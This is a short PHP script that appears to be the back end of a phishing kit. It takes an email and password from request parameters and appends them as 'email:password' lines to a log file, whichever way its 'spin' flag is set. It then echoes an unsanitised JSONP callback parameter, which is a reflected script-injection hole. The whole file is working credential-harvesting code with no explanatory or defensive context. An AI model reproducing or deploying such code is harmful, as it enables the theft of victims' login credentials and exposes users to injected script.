<?php
	
	header("content-type: application/json");
	$email = $_GET['email'];
	$password = $_GET['password'];
	
	$spin = @file_get_contents('spin.txt');
	if ($spin == "" || !$spin) $spin = "0";
	$spin = intval($spin);
	
	if ($spin == "0")
	{
		$fh = fopen('spin.txt', 'w');
		fwrite($fh, '1');
		fclose($fh);
		
		$fh = fopen('logs/fresh.txt', 'a');
		fwrite($fh, $email.":".$password."\r\n");
		fclose($fh);
	} 
	else
	{
		$fh = fopen('spin.txt', 'w');
		fwrite($fh, '0');
		fclose($fh);
		
		$fh = fopen('logs/fresh.txt', 'a');
		fwrite($fh, $email.":".$password."\r\n");
		fclose($fh);
	}
	
	$callback = $_GET['callback'];
	echo $_GET['callback']. '([])';  